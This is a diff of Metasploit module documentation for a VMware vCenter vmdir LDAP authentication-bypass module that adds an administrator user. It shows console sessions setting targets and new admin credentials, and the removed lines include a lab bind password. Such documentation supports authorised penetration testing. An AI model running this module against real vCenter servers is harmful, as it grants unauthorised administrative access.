@@ -32,13 +32,13 @@ Add an admin user to the vCenter Server.
 If you already have the LDAP base DN, you may set it in this option.
 `dc=vsphere,dc=local` will be used if not set.
 
-### USERNAME
+### LDAPUsername
 
 If you already have a password to authenticate to the LDAP server (see
 USERNAME), this option let you setup the bind username in DN format (e.g
 `cn=1.2.3.4,ou=Domain Controllers,dc=vsphere,dc=local`).
 
-### PASSWORD
+### LDAPPassword
 
 The password to authenticate to the LDAP server, if you have it.
 
@@ -55,22 +55,35 @@ Set this to the password for the new admin user.
 ### VMware vCenter Server 6.7 virtual appliance on ESXi (vulnerable target)
 
 ```
-msf5 > use auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass
-msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > options
+msf6 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > show options
 
 Module options (auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass):
 
    Name          Current Setting  Required  Description
    ----          ---------------  --------  -----------
    BASE_DN                        no        LDAP base DN if you already have it
-   DOMAIN                         no        The domain to authenticate to
-   NEW_PASSWORD                   no        Password of admin user to add
-   NEW_USERNAME                   no        Username of admin user to add
-   PASSWORD                       no        The password to authenticate with
-   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT         636              yes       The target port
+   NEW_PASSWORD                   yes       Password of admin user to add
+   NEW_USERNAME                   yes       Username of admin user to add
    SSL           true             no        Enable SSL on the LDAP connection
-   USERNAME                       no        The username to authenticate with
+
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   LDAPDomain                     no        The domain to authenticate to
+   LDAPPassword                   no        The password to authenticate with
+   LDAPUsername                   no        The username to authenticate with
+   RHOSTS                         no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
+                                            metasploit.html
+   RPORT         636              no        The target port
 
 
 Auxiliary action:
@@ -80,6 +93,8 @@ Auxiliary action:
    Add   Add an admin user
 
 
+
+View the full module info with the info, or info -d command.
 msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set rhosts [redacted]
 rhosts => [redacted]
 msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set new_username msfadmin
@@ -136,22 +151,35 @@ msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) >
 ### VMware vCenter Server 6.7.0.2 virtual appliance on ESXi (not vulnerable target)
 
 ```
-msf6 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > options
+msf6 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > show options
 
 Module options (auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass):
 
-   Name      Current Setting                         Required  Description
-   ----      ---------------                         --------  -----------
-   BASE_DN   dc=vsphere,dc=local                     no        LDAP base DN if you already have it
-   USERNAME  cn=192.168.3.32,ou=Domain Controlle     no        The username to authenticate to LDAP server
-             rs,dc=vsphere,dc=local
-   PASSWORD  #$F4!4SeV\BL~L2gb(oa                    no        Password for the BIND_DN
-   NEW_PASSWORD  NewPassword123#                     no        Password of admin user to add
-   RHOSTS    192.168.3.32                            yes       The target host(s), see https://github.com/rapid7/metasploit-framework
-                                                               /wiki/Using-Metasploit
-   RPORT     636                                     yes       The target port
-   SSL       true                                    no        Enable SSL on the LDAP connection
-   NEW_USERNAME  MsfAdmin                            no        Username of admin user to add
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   BASE_DN                        no        LDAP base DN if you already have it
+   NEW_PASSWORD                   yes       Password of admin user to add
+   NEW_USERNAME                   yes       Username of admin user to add
+   SSL           true             no        Enable SSL on the LDAP connection
+
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   LDAPDomain                     no        The domain to authenticate to
+   LDAPPassword                   no        The password to authenticate with
+   LDAPUsername                   no        The username to authenticate with
+   RHOSTS                         no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
+                                            metasploit.html
+   RPORT         636              no        The target port
 
 
 Auxiliary action:
@@ -160,6 +188,49 @@ Auxiliary action:
    ----  -----------
    Add   Add an admin user
 
+
+
+View the full module info with the info, or info -d command.
+msf6 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > show options
+
+Module options (auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   BASE_DN                        no        LDAP base DN if you already have it
+   NEW_PASSWORD                   yes       Password of admin user to add
+   NEW_USERNAME                   yes       Username of admin user to add
+   SSL           true             no        Enable SSL on the LDAP connection
+
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   LDAPDomain                     no        The domain to authenticate to
+   LDAPPassword                   no        The password to authenticate with
+   LDAPUsername                   no        The username to authenticate with
+   RHOSTS                         no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
+                                            metasploit.html
+   RPORT         636              no        The target port
+
+
+Auxiliary action:
+
+   Name  Description
+   ----  -----------
+   Add   Add an admin user
+
+
+
+View the full module info with the info, or info -d command.
 
 msf6 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > run
 [*] Running module against 192.168.3.32
